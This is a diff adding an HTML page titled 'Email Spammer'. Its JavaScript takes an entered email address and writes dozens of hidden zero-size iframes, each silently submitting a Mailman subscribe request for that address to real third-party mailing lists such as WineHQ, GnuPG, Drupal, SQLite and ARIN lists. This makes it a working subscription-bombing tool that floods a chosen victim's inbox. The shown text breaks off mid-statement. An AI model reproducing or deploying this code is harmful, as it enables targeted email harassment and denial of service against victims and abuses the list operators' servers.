@@ -1,0 +1,2069 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Email Spammer</title>
+    <style>
+      body {
+        background-size: cover;
+      }
+
+      input[type="text"] {
+        padding: 5px;
+        border: 2px solid #ccc;
+        -webkit-border-radius: 5px;
+        border-radius: 5px;
+      }
+
+      input[type="text"]:focus {
+        border-color: #333;
+      }
+
+      input[type="button"] {
+        padding: 5px 15px;
+        border: 2px solid #ccc;
+        cursor: pointer;
+        -webkit-border-radius: 5px;
+        border-radius: 5px;
+      }
+      img {
+        border-radius: 12px;
+        border: 10px solid #333;
+        display: block;
+        margin-left: auto;
+        margin-right: auto;
+        max-width: 100%;
+        height: auto;
+      }
+      img:hover {
+        -webkit-transform: scaleX(-1);
+        transform: scaleX(-1);
+      }
+    </style>
+  </head>
+  <body>
+    <script type="text/javascript">
+      spam = function () {
+        var spam_id = escape(document.getElementById("spam_id").value);
+        if (spam_id == "") {
+          alert("Type in an email address!");
+          return false;
+        }
+
+        document.write(
+          "<head><title>Sending!!!</title></head><body><center><h1><span style='font-size:28pt;font-family:courier;color:#ccc'>Spam Emails are being sent to:</h1><br><b><span style='font-size:28pt;color:black'>" +
+            spam_id
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://flybynews.com/mailman/subscribe/flybynews_flybynews.com?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://www.winehq.org/mailman/subscribe/wine-users?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://www.winehq.org/mailman/subscribe/wine-anounce?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://www.winehq.org/mailman/subscribe/wine-bugs?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://www.winehq.org/mailman/subscribe/wine-cvs?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://www.winehq.org/mailman/subscribe/wine-devel?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://www.winehq.org/mailman/subscribe/wine-patches?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://www.winehq.org/mailman/subscribe/wine-releases?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://www.winehq.org/mailman/subscribe/wine-tests-results?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://www.winehq.org/mailman/subscribe/wineconf?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gnupg-users?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/debian?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/fymt-de?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gcrypt-devel?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gnupg-announce?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gnupg-commits?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gnupg-de?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gnupg-devel?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gnpg-doc?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gnupg-es?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gnupg-i18n?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gnupg-pt?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gnuk-users?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gnutls-commits?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gnutls-dev?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gnutls-devel?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gnutls-help?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gnutls-help?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gpa-dev?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gpgweb-commits?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/gph-commits?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/mod-gnutls-devel?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.gnupg.org/mailman/subscribe/neues?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mailman.acomp.usf.edu/mailman/subscribe/lacsf?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.drupal.org/mailman/subscribe/development?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.drupal.org/mailman/subscribe/consulting?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.drupal.org/mailman/subscribe/core?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.drupal.org/mailman/subscribe/development?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.drupal.org/mailman/subscribe/drupal?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.drupal.org/mailman/subscribe/drupal-news?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.drupal.org/mailman/subscribe/drupal-twg?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.drupal.org/mailman/subscribe/security-internals?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.drupal.org/mailman/subscribe/security-news?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.drupal.org/mailman/subscribe/support?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.drupal.org/mailman/subscribe/svn?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.drupal.org/mailman/subscribe/testing?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.drupal.org/mailman/subscribe/themes?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.drupal.org/mailman/subscribe/translations?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.drupal.org/mailman/subscribe/webmasters?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://webmail.mnet.state.mn.us/mailman/subscribe/dhs-csed?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://www.ogf.org/mailman/subscribe/occi-wg?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.cluenet.de/mailman/subscribe/ipv6-ops?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://list.blackcats.org.uk/mailman/subscribe/blackcats?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.secondlife.com/cgi-bin/mailman/subscribe/educators?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.secondlife.com/cgi-bin/mailman/subscribe/nonprofits?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.secondlife.com/cgi-bin/mailman/subscribe/opensource-dev?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.secondlife.com/cgi-bin/mailman/subscribe/tpvdir-announce?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.xen.org/cgi-bin/mailman/subscribe/xen-announce?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://miniaturelists.com/mailman/subscribe/ladyjane_miniaturelists.com?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.fossil-scm.org:8080/cgi-bin/mailman/subscribe/fossil-dev?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.fossil-scm.org:8080/cgi-bin/mailman/subscribe/fossil-users?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.fossil-scm.org:8080/cgi-bin/mailman/subscribe/jim-devel?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.fossil-scm.org:8080/cgi-bin/mailman/subscribe/mailman?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.fossil-scm.org:8080/cgi-bin/mailman/subscribe/sqlite-announce?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.fossil-scm.org:8080/cgi-bin/mailman/subscribe/sqlite-dev?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.fossil-scm.org:8080/cgi-bin/mailman/subscribe/sqlite-users?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://sqlite.org:8080/cgi-bin/mailman/subscribe/fossil-dev?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://sqlite.org:8080/cgi-bin/mailman/subscribe/fossil-users?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://sqlite.org:8080/cgi-bin/mailman/subscribe/jim-devel?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://sqlite.org:8080/cgi-bin/mailman/subscribe/mailman?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://sqlite.org:8080/cgi-bin/mailman/subscribe/sqlite-announce?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://sqlite.org:8080/cgi-bin/mailman/subscribe/sqlite-dev?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://sqlite.org:8080/cgi-bin/mailman/subscribe/sqlite-users?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://starj.com/mailman/subscribe/headlines_starj.com?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/admins-listas?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/cisl-comunidade?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/comunicacaofisl?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/consoli?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/culturaasl?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/curitibalivre?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/flisol-br?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/gt-educacao?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/gt-santamaria?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/hackingday?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/landell?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/lista_geral_asl?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/listaoid?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/mobilizacaonacional?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/noosfero-br?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/noosfero-dev?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/openfire-br?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/pontosdecultura?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/postfix-br?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/programafisl?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/psl-brasil?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/psl-df?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/psl-es?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/psl-go?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/psl-mg?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/psls-nordeste?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/risol?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/roboticafisl?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/roboticalivre?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/tradutoresfisl?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/voluntariosfisl?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://listas.softwarelivre.org/cgi-bin/mailman/subscribe/wsl?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/2050-wg?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/ac.help?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/aflow?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/arin-announce?email=" +
+            spam_id +
